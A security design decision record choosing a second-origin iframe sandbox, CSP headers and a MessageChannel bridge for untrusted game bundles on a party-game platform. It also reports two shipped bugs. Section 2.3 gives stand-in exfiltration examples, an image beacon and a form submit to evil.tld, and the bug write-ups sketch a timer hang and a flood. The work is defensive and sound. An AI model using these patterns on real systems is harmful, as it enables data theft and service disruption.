# Phase G Sandbox Security Analysis and Decision

> Status: Decision record, 2026-08-08. Read before implementing Phase G of
> `2026-08-05-hubbub-cloud-hosting-and-game-distribution-design.md`.
> Scope: the Phase G sandbox mechanism only. Not a general security audit (see section 7).
>
> Inputs: three independent review lenses (attacker, alternatives, operator) plus independent
> verification of the load-bearing browser-behaviour claims (section 4).

---

## 1. Verdict

**Yes, "second origin" was the right call, with one carve-out and one correction.**

The alternatives lens ranked a same-origin `sandbox` iframe first on the grounds that an opaque
origin delivers the same storage and DOM isolation for free. That claim is true and verified, but
it prices only the happy path. A second origin is not primarily buying a stronger boundary; it is
buying **containment of the mistakes you will make later**. Two of those mistakes are cheap and
realistic: adding `allow-same-origin` to the token list (on a same-origin frame this is
catastrophic and total, because MDN states plainly that a same-origin document with both
`allow-scripts` and `allow-same-origin` can remove its own sandbox attribute; on a cross-origin
frame the same edit is nearly harmless), and getting a response header wrong on a bundle route so
that attacker-authored bytes become directly loadable top-level on the origin that holds
`hubbub:token:*`. With a second origin, neither mistake reaches a player. This is exactly the
project's own recorded lesson that protections must be structural, not documented, applied to the
origin question itself. The carve-out: the requirement must be satisfiable everywhere, and it is,
because **an origin is scheme + host + port**, so a second port counts. The correction: the
process-isolation argument used by both lenses to justify either option is close to worthless on
phones, and should not be cited as a reason for anything (section 4.3).

---

## 2. The recommendation

### 2.1 Origin

- Game bundles and the frame document are served from a **second origin**, defined as any
  distinct scheme + host + port. A distinct port is sufficient and is the self-host default.
- Cloud: a second Cloudflare Worker on its own `*.workers.dev` subdomain (section 3.1).
- Self-host / LAN: the shipped default config binds the sandbox origin to a second port on the
  same host. The operator changes nothing to satisfy the requirement.
- The shell **refuses to mount a game** if the resolved sandbox origin equals
  `window.location.origin`, with an error naming the fix. Refusal is safe here precisely because
  the default config already satisfies the rule; the only way to reach the refusal is to actively
  collapse both onto one vhost.

### 2.2 Iframe attributes, exactly

```html
<iframe
  src="<SANDBOX_ORIGIN>/frame.html?game=<id>&v=<contentHash>"
  sandbox="allow-scripts"
  allow=""
  referrerpolicy="no-referrer"
></iframe>
```

- `sandbox="allow-scripts"` and nothing else. Never `allow-same-origin`. Never
  `allow-top-navigation` or `allow-top-navigation-by-user-activation` (that token is the classic
  malicious-ad redirect: any tap lets the game navigate the host's whole tab away to a phishing
  page). Never `allow-popups`, `allow-modals`, `allow-forms`, `allow-downloads`.
- `allow=""` sets an empty Permissions Policy, denying camera, mic, geolocation and motion
  sensors by default. A `needs.motion` game gets `allow="accelerometer; gyroscope"` and nothing
  else, granted per-game from its declared `needs`, never blanket.

### 2.3 Response headers on the sandbox origin

Every byte the sandbox origin serves:

- `X-Content-Type-Options: nosniff`
- Bundles served as `text/javascript`. The **only** HTML the sandbox origin ever serves is the
  platform-authored `frame.html`. No author-supplied HTML, ever.
- On `frame.html`:
  `Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob: <deezer-preview-host>; font-src 'self'; connect-src 'self' <relay-wss> <proxy-origin>; frame-src 'none'; child-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'; frame-ancestors <SHELL_ORIGIN>; sandbox allow-scripts`

Three of those directives are load-bearing and are missing from the current design text, which
names only `connect-src` and `script-src`:

- `img-src` / `media-src` / `form-action`: without them, CSP does not stop the exfiltration and
  phishing channels that do not use `fetch` at all, namely an `<img src="https://evil.tld/?d=...">`
  beacon and a `<form action="https://evil.tld">` submit.
- `frame-ancestors <SHELL_ORIGIN>`: pins who may frame the game.
- `sandbox allow-scripts` **as a response header**: this re-applies the sandbox even when the
  document is loaded top-level, not framed. It is the mechanism that makes the same-origin
  degraded mode survivable at all, and it costs nothing here.

### 2.4 The bridge contract, corrected

**All three lenses recommended an `event.origin` check. On this design that check does not work,
and implementing it as written would produce false confidence.** A sandboxed frame without
`allow-same-origin` has an opaque origin. `event.origin` on its messages is the string `"null"`,
which every opaque origin shares, so it is not an identity. Symmetrically, the shell cannot use a
specific `targetOrigin` to reach the frame: `"null"` is not a parseable URL, so
`postMessage(msg, "null")` throws (spec-read, section 4.6). This is true for the cross-origin and
same-origin variants alike, since both frames are opaque.

Use a **MessageChannel capability**, which removes the problem instead of papering over it:

1. Shell mounts the iframe, waits for `load`.
2. Shell creates `const { port1, port2 } = new MessageChannel()`.
3. Shell sends exactly one bootstrap message:
   `iframe.contentWindow.postMessage({ t: "hubbub-init", players }, "*", [port2])`.
   This is the **only** `"*"` postMessage permitted anywhere in the codebase, and it is safe
   because it carries no secrets: `PlayerInfo` is `{ id, name }` only
   (`packages/sdk/src/types.ts:3-6`), no token, no colorId, no emoji.
4. Frame accepts the first message where `event.source === window.parent` and
   `event.ports.length === 1`, keeps the port, then removes its `window` message listener.
5. Everything after that flows over `port.postMessage` / `port.onmessage` in both directions. A
   MessagePort is a capability: no other window holds it, so no other window can inject, and there
   is no `targetOrigin` argument to get wrong.
6. The shell validates every inbound port message with Zod before acting on it.

Payload shapes are unchanged from the design: shell to sandbox `{type:"action", playerId, action,
now}` and `{type:"playersChanged", players}`; sandbox to shell `{type:"state", state}`,
`{type:"deadline", at}`, `{type:"result", result}`.

### 2.5 What the shell must never trust

- **`stateSchema` is author-declared and therefore not a security control.** A malicious bundle
  declares `z.unknown()` and the check is a no-op. Its real job is catching an authoring bug
  (a `Map`, a function, a DOM node in state). Keep it, do not credit it.
- **A platform size cap runs before and independently of the declared schema**, on the serialized
  byte length of the state payload. This is the only hard floor and it must not be reachable
  through anything the game declares.
- **`deadline.at` needs a floor, not just `Number.isFinite`.** See live bug LB-1: `at` in the past
  is finite and drives the shell's own timer into a tight loop.
- **`result.winnerId` must be a currently-known player id or null.**
- **Well-typed but malicious content is out of scope and stays out of scope.** A game that
  legitimately declares `message: string` can put phishing text in it, and a game's screen view is
  the largest trusted-looking region on the host's TV, so it can render a convincing fake Hubbub
  dialog ("session expired, rescan this QR"). The sandbox stops it reading data; it does not stop
  it lying visually. Naming this so nobody assumes "schema validated" means "trustworthy".

### 2.6 Fail closed

- If the frame does not ACK the bootstrap within a timeout, show an error state. **Never** fall
  back to importing the game into the shell.
- There is no `try sandboxed, catch, run in page` branch, and one must never be added as a
  robustness feature. The direct-import path (`packages/games-manifest/src/lazy.ts`) becomes
  dev-loop-only and is compiled out of production (section 5).
- Mixed content already fails closed and loudly (browsers refuse an insecure iframe in a secure
  page), which is the desired shape.

### 2.7 Content-hash pinning: make it content-addressed

The design says "the platform serves the bytes matching that hash" without a mechanism, and two
readings satisfy that sentence with very different security. Choose the first:

- **Content-addressed** (required): the server derives the storage key from a hash it computes
  over the uploaded bytes at ingest, e.g. `/games/<id>/<sha256-of-bytes>.js`. You cannot fetch
  hash H and receive bytes that do not hash to H, because H is the key.
- **Label-based** (forbidden): the author claims a hash as metadata, bytes are stored under a
  separate key, nothing recomputes. This is decorative and does not close the Chrome-extension
  post-review-swap gap the design exists to close; it only moves the trust point.

Note that the client has no independent backstop either way: ES module `import()` has no
`integrity` equivalent. Client-side verification (fetch bytes, hash, compare, evaluate via Blob
URL) is possible but not required for Phase G; if it is skipped, the guarantee is entirely
server-side and should be described that way rather than as end-to-end.

---

## 3. Cloud vs LAN

These differ, and the LAN guarantee is genuinely narrower. Say so in the docs rather than
pretending one uniform rule holds.

### 3.1 Cloud (the live deployment)

Second origin is free and clean. Verified: the Cloudflare Workers **Free plan allows 100 Workers
per account** (Paid: 500), each getting its own `*.workers.dev` subdomain with Cloudflare-issued
TLS, no zone and no DNS purchase. So a second Worker, e.g. `hubbub-games.tabsxlabs.workers.dev`
alongside today's `hubbub.tabsxlabs.workers.dev`, is one more `wrangler.jsonc` and one more
`wrangler deploy`. The design's own framing (`games.hubbub.app` vs `app.hubbub.app`) implies a
purchased second domain and should be corrected: the free path is the documented default.

Per-path response headers for static assets are set with a `_headers` file in the assets
directory, or from the Worker's own `Response` for dynamically generated responses.

Cloud guarantee: full. Distinct site, real TLS, secure context, full Site Isolation on desktop
Chrome for the screen.

### 3.2 LAN / self-host

Second origin via a second **port** is a real origin per RFC 6454, and it does isolate
`localStorage`, DOM access across the frame boundary, and `fetch` without CORS. It costs nothing
and ships as the default. But three properties are narrower than cloud, and none of them are
caused by Phase G:

1. **No TLS means no secure context.** `needs.motion` games cannot run on a plain-HTTP LAN. Phase
   G doubles the problem in principle (both origins would need a secure context), but it was
   already unsolved for origin one. There is no clean fix: Let's Encrypt cannot issue for
   private-range IPs, self-signed certs train every guest to click through a warning before
   joining, and `sslip.io`-style tricks need internet at issuance time, breaking the offline-LAN
   invariant.
2. **Cookies ignore port** (RFC 6265 scopes by host and path). Port-separated origins share a
   cookie jar. **Hard invariant: the reconnect token must stay in `localStorage` and must never
   move to a cookie.** That is what makes the port trick work at all, and it is a live landmine
   for Phase J (reconnect token hardening), which is the phase most likely to reach for a cookie.
   Record it as a constraint on Phase J, not as prose here.
3. **Port separation buys nothing against a network attacker.** On a plain-HTTP LAN, anyone on the
   WiFi can read and modify all traffic regardless. The sandbox is not the weakest link on that
   deployment shape.

**User-visible consequence to state honestly in the self-host docs:** on a plain-HTTP LAN
deployment, a malicious game bundle still cannot read the shell's stored token or DOM, but the
deployment as a whole has no transport confidentiality and no motion-sensor games. LAN mode has a
narrower security property than cloud mode. That honest statement is better than a uniform rule an
operator cannot satisfy, because a blocked operator reaches for the bypass flag or a self-signed
cert, and both outcomes are worse than the one being avoided.

### 3.3 If a deployment truly cannot get a second origin

Degraded mode, not a silent fallback: same-origin frame, `sandbox="allow-scripts"` only, the CSP
`sandbox` response header from 2.3 (which is what stops the bundle path from becoming a top-level
XSS primitive on the shell's own origin), `nosniff`, JS-only content types, plus a persistent
undismissable banner on the screen. The isolation is real, but a single future edit adding
`allow-same-origin` collapses it completely, which is precisely why this is the fallback and not
the default.

---

## 4. What was verified, and how

### 4.1 Opaque origin from `sandbox` without `allow-same-origin`: CONFIRMED

MDN, `<iframe>` sandbox attribute: without `allow-same-origin`, "the resource is treated as being
from a special origin that always fails the same-origin policy (potentially preventing access to
data storage/cookies and some JavaScript APIs)". This is spec-mandated HTML behaviour on every
engine, independent of the URL the frame was loaded from. So the alternatives lens's core claim is
correct: a same-origin sandboxed frame does get storage and DOM isolation.

### 4.2 The `allow-same-origin` footgun is asymmetric: CONFIRMED, and this decides the question

MDN states directly: "When the embedded document has the same origin as the embedding page, it is
strongly discouraged to use both `allow-scripts` and `allow-same-origin`, as that lets the
embedded document remove the `sandbox` attribute, making it no more secure than not using the
`sandbox` attribute at all."

- Same-origin + that one added token: total collapse. The game reaches into the parent, strips its
  own sandbox, reads `hubbub:token:*`.
- Cross-origin + that same token: the game gets its own origin's storage, which is empty. It still
  cannot touch the shell's DOM or storage.

One token, one edit, and the blast radius differs by everything. This is the single strongest
argument for the second origin and neither the alternatives lens nor the operator lens weighed it.

### 4.3 Chromium 127 process isolation of same-site opaque frames: CONFIRMED, and largely irrelevant

Chromium's own process-model doc: "Documents with the sandbox attribute and without
`allow-same-origin` ... may be same-site with their parent or opener but use an opaque origin.
Since 127.0.6483.0, Desktop Chromium moves these documents into a separate process from their
parent or opener." So the alternatives lens got this right.

**But the argument does not survive being applied symmetrically.** The same doc: "On Android,
these documents will only be in a separate process if their parent/opener uses Partial Site
Isolation." And Chrome for Android runs Partial Site Isolation, which isolates only sites where
the user logs in with a password, logs in via a third-party provider, or which send
Cross-Origin-Opener-Policy headers. Hubbub is none of those. So on Android, **neither** option is
process-isolated: not the same-origin opaque frame, and not a cross-site game frame either.

Controller views run on every player's phone. That is the majority device class in this product.
Conclusion: **do not justify the origin decision with process isolation.** It is a desktop-only
margin that both options get and both options lose in the same places. Justify it with 4.2 and 4.4
instead.

### 4.4 What a separate origin buys that an opaque origin does not

- **The `allow-same-origin` asymmetry** (4.2). Primary reason.
- **Removal of a permanent header dependency.** Serving attacker-authored bytes on the origin that
  holds your session storage makes that origin's security depend on getting `Content-Type`,
  `nosniff` and `CSP: sandbox` right on every bundle route, forever, on every deployment. Get one
  wrong and a game bundle becomes directly loadable top-level, unsandboxed, on the shell's origin.
  A second origin removes that class of bug rather than defending against it. This is settled
  industry practice: web.dev's "Securely hosting user data" recommends a separate origin, lists
  `Content-Type` / `X-Content-Type-Options: nosniff` / `Content-Disposition` / `CSP: sandbox` /
  `CSP: default-src 'none'` / `Cross-Origin-Resource-Policy` only as the fallback for when a
  separate domain is unavailable, and notes that "not all web browsers implement process isolation
  for sandbox documents". Google's sandbox-domain pattern (`googleusercontent.com`) is the same
  reasoning at scale.
- **Service workers: no delta.** Verified: a sandboxed frame without `allow-same-origin` is not
  controlled by the parent origin's service worker; interception requires `allow-same-origin`. So
  the shell's PWA service worker cannot intercept the game frame's fetches in either variant, and
  the game cannot register a service worker of its own from an opaque origin. Not a differentiator,
  and worth recording so nobody re-litigates it.
- **CSP inheritance: no delta, with one trap.** A frame loaded from a real URL does not inherit the
  parent's CSP; it gets its own from its own response headers, same in both variants. The trap is
  local schemes: `about:srcdoc`, `about:blank`, `blob:` and `data:` frames **do** inherit the
  parent's policy container. So do not implement the frame document as `srcdoc` or a Blob URL as a
  convenience, or the CSP story changes shape underneath you.
- **Cache poisoning / bundle URL reachable for other purposes:** only meaningful in the
  same-origin variant, where the bundle path is same-origin for `fetch`, for direct navigation, and
  for anything else on the origin. A second origin makes it inert.

### 4.5 Other engines

Firefox's Fission and Safari's process model: could not confirm whether either process-isolates
opaque-origin sandboxed frames. Mozilla has open bugs on the topic rather than a shipped
statement. Marked UNVERIFIED below. It does not change the decision, because per 4.3 the
process-isolation axis is not what the decision rests on, and the storage/DOM guarantee (4.1) is
spec-mandated on every engine.

### 4.6 UNVERIFIED

Nothing below should be repeated as fact.

- Whether Firefox (Fission) or Safari process-isolate opaque-origin sandboxed frames, same-site or
  cross-site. Storage and DOM isolation hold regardless; only the Spectre-class process margin is
  in question.
- That `postMessage(msg, "null")` throws `SyntaxError`. Read from the HTML spec's targetOrigin
  algorithm (parse as URL, throw on failure) and not empirically tested in a browser. The
  MessageChannel design in 2.4 is correct either way, since `event.origin === "null"` is not an
  identity regardless of whether the send side throws.
- postMessage / MessageChannel latency at real 60fps action rates. No measured number for this
  scenario. The design's own "a few ms" estimate is plausible but unmeasured, and it applies
  equally to both origin options.
- Whether the CSP `sandbox` response header and the iframe `sandbox` attribute compose cleanly when
  both are present with the same token set. Expected to intersect harmlessly; not tested.
- Whether Cloudflare Workers Assets `_headers` supports every directive above on the current plan,
  and whether it applies to the specific asset routes the game bundles will use. Verify at
  implementation time by fetching the deployed URLs and asserting the headers came back.
- The exact Deezer preview CDN host pattern needed for `media-src`.
- Cloudflare's 100-Workers Free plan limit was read from the current limits page. It is a vendor
  number that can change; re-check before relying on it in self-host documentation.

---

## 5. Structural enforcement checklist

Every item is a build step, a test, or a runtime refusal. None of them is a sentence in a doc.
The project already has a recorded case of a prose-only rule being ignored until it was made
structural; this list exists so Phase G does not repeat it.

| # | Mechanism | Catches |
|---|---|---|
| S1 | Bundler `define` constant (`__HUBBUB_DEV_LOADER__: false`) gated by dead-code elimination. Never `process.env.NODE_ENV` read at runtime. | An operator setting `NODE_ENV=development` to fix an unrelated build issue and silently re-enabling the unapproved-bundle loader on a public instance. |
| S2 | CI step greps the built production assets for a sentinel string that exists only inside the dev-loader module. Fail the build if found. | S1 silently regressing in a later refactor. This failure mode produces no test failure and no visible symptom, so nothing else will catch it. |
| S3 | CI step greps the built production assets for `allow-same-origin`. Fail if present. | The one-token catastrophic edit from 4.2. One line of CI. |
| S4 | Lint rule / path-allowlisted grep banning `postMessage(` with a literal `"*"` outside the single bootstrap module. | Wildcard targets creeping into the hot path once someone finds the origin check does not work and reaches for `"*"` everywhere. |
| S5 | Runtime boot assertion: `new URL(SANDBOX_BASE).origin !== window.location.origin`, else refuse to mount with an actionable error. Plus the same check at iframe-creation time. | The reverse-proxy typo that collapses both origins into one vhost, which is invisible by construction: a working demo looks exactly like a broken one. |
| S6 | Platform size cap on the serialized state payload, applied before and independently of the game's declared `stateSchema`. Unit test asserts a `z.unknown()` schema does not bypass it. | A malicious bundle declaring a permissive schema to nullify the only content check. |
| S7 | Minimum re-arm interval on shell-side deadline scheduling, plus a unit test with a game whose `nextDeadline` returns a past timestamp. | Live bug LB-1, and its Phase G weaponised form. |
| S8 | Per-connection rate limit on in-game `action` messages at the relay. | Live bug LB-2. |
| S9 | Integration test that fetches the deployed sandbox origin and asserts the full CSP directive list plus `nosniff` came back. | Silent header regressions, which is the normal failure mode for headers. |
| S10 | Content-addressed storage keys derived server-side from the uploaded bytes, plus a test that uploading different bytes under an approved hash is rejected. | Label-based pinning, which satisfies the design's wording while closing nothing (2.7). |
| S11 | Approval catalogue format has no wildcard entry type and no `approvalRequired: false` boolean. An explicit non-empty allowlist file or nothing. | "Approve everything" being one flipped bit away in a copied starter config. |
| S12 | Type-level: the bootstrap init payload is typed as `PlayerInfo[]`, with a test asserting no token field is reachable from it. | Scope creep on the bridge, which is the natural way this erodes: passing full `Player` "because the view wants an avatar", or handing the game a fetch capability instead of keeping `setup()` server-side. |

---

## 6. LIVE BUGS IN SHIPPED CODE, NOT PHASE G WORK

**Neither of these is a Phase G design issue. Both reproduce in the code deployed today. They are
written up here only because this review surfaced them; file them as standalone todos and fix them
in the separate full security session. Do not bundle them into Phase G.**

### LB-1: shell timer re-arms with no floor, hanging the host's main thread

**Status: CONFIRMED live in shipped code.**

`packages/sdk/src/screen-authority.ts:24-32`

```js
function scheduleTimer() {
  clearTimer();
  const deadline = inst?.nextDeadline();
  if (deadline === null || deadline === undefined) return;
  timer = setTimeout(() => {
    if (inst?.checkTimeout(Date.now())) onState(inst.get());
    scheduleTimer();            // re-arms unconditionally
  }, Math.max(0, deadline - Date.now()));   // clamps to 0, no floor
}
```

`scheduleTimer()` on line 30 runs whether or not `checkTimeout` advanced the state, and the delay
on line 31 clamps to `0` with no minimum. `GameInstance.checkTimeout`
(`packages/sdk/src/runtime.ts:37-43`) returns `false` immediately when `logic.onTimeout` is
undefined, and returns `false` when `now < deadline`, in both cases leaving the deadline unchanged.

**Reproduction sketch.** A game whose `nextDeadline(state)` returns a finite past timestamp, with
no `onTimeout` hook defined (or with an `onTimeout` that does not advance state past the
deadline): `setTimeout(..., 0)` fires, `checkTimeout` returns `false`, `scheduleTimer()` re-arms at
`0` again, forever. This is not the iframe CPU-hog case that Site Isolation contains. It is a tight
loop on the **screen's own privileged main thread** (`apps/screen/src/App.tsx:81` wires the
authority into the live app), which also owns the WebSocket keepalives, the reconnect UI, and the
Wake Lock that keeps the TV awake.

Today this is reachable from a plain authoring bug in a first-party game. Once Phase G lands and
`deadline.at` arrives from an untrusted bundle over the bridge, it becomes attacker-controlled, and
`Number.isFinite(at)` (the design's stated validation) does not stop it: `Date.now()` is finite.

**Fix direction (do not apply here):** a minimum re-arm interval, and drop the re-arm entirely when
`checkTimeout` returned `false` and the deadline has not moved.

### LB-2: no rate limit on the in-game `action` hot path

**Status: CONFIRMED live in shipped code.**

`packages/relay/src/room.ts:269-272`

```js
if (msg.t === "action") {
  if (!conn?.playerId || this.data.mode !== "in-game" || !this.data.screenConnId) return [];
  return [{ to: "conn", connId: this.data.screenConnId, msg: { t: "gameAction", ... } }];
}
```

Every inbound `action` is forwarded unconditionally. Rate limiting exists only on the HTTP join
path: `apps/worker/src/rate-limiter-do.ts:18-30` exposes `checkCreate`, `checkJoin` and
`checkDeezer`, called from `apps/worker/src/index.ts:55`, `:86` and `:108`. The WebSocket path,
`apps/worker/src/room-do.ts:69-90` (`webSocketMessage`), calls no limiter at all.

**Reproduction sketch.** One controller in an in-game room sends `{t:"action", ...}` in a tight
loop over its WebSocket. Each message costs: 20 request units against the Workers quota (the
documented 20:1 WebSocket multiplier), one relay hop to the screen, one reducer step on the host's
device, one `gameStatePush` back, and a `{to:"all"}` fanout at `packages/relay/src/room.ts:294` to
every connected player. One malicious controller therefore amplifies into O(N) decodes on N other
players' devices plus a roughly 20:1 billing amplification against the free tier. `gameStatePush`
is coalesced for DO **storage** (`apps/worker/src/room-do.ts:12-14`, `:81-85`), which is good, but
the broadcast and the request billing are per message and are not coalesced.

**Fix direction (do not apply here):** a per-connection token bucket on in-game `action`, enforced
in `Room.handleMessage` so both the Node relay and the DO inherit it.

---

## 7. What this review did NOT cover

Scope for the separate full security session:

- Anything outside the Phase G sandbox mechanism. This was not a general audit.
- The relay and Durable Object authorization model beyond the two bugs above: room-code guessing
  economics, `attachScreen` takeover, `rtcSignal` forwarding abuse, host-transfer semantics.
- Phase J reconnect token hardening. Only one constraint was recorded here (section 3.2, item 2:
  the token must not move to a cookie or LAN port separation breaks).
- The Deezer proxy beyond the attacker lens's read that it is correctly scoped. One residual noted
  there: limiting is per-requesting-IP, so many players running the same bundle can collectively
  hammer upstream through the platform's single egress identity without any one IP tripping the
  limiter.
- General DoS against the Worker and DO layer: memory exhaustion, connection floods, room-creation
  floods beyond the existing per-IP cap.
- Supply-chain security of the platform's own dependencies.
- The human and social side of the approval process: reviewer fatigue, what "approved" actually
  attests to, revocation of an already-approved hash.
- Content moderation of well-typed but malicious state (2.5), and UI trust confusion where a game's
  screen view renders a convincing fake platform dialog on the host's TV. Both are real host-facing
  harms that a sandbox structurally cannot address.
- Memory exhaustion by a game bundle crashing the host tab mid-party. Acknowledged as an explicit
  non-goal by the design ("crash resilience is nice to have"), but it is a cheap, reliable way for a
  malicious bundle to interrupt the party.
- The `stateSchema` migration question when a game version bump changes the schema under an
  existing Phase D backup blob. Already an open question in the design; unchanged by this review.
- The MIT-licence boundary: nothing here protects a player from an operator who forks the source,
  forces the bypass open, and runs that as their own instance. Inherent to any client-executed
  trust model, named so it is not mistaken for a gap in the mechanisms above.

---

## Sources

- [MDN, `<iframe>` sandbox attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [MDN, CSP `sandbox` directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox)
- [Chromium, Process Model and Site Isolation](https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md)
- [Google Security Blog, Protecting more with Site Isolation](https://security.googleblog.com/2021/07/protecting-more-with-site-isolation.html)
- [web.dev, Securely hosting user data](https://web.dev/articles/securely-hosting-user-data)
- [Google Security Blog, Content hosting for the modern web](https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html)
- [w3c/ServiceWorker issue 648, interception of sandboxed iframes](https://github.com/w3c/ServiceWorker/issues/648)
- [w3c/webappsec-csp issue 700, srcdoc CSP inheritance](https://github.com/w3c/webappsec-csp/issues/700)
- [Cloudflare Workers platform limits](https://developers.cloudflare.com/workers/platform/limits/)
- [Cloudflare Workers static assets, Headers](https://developers.cloudflare.com/workers/static-assets/headers/)
- [MDN, Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
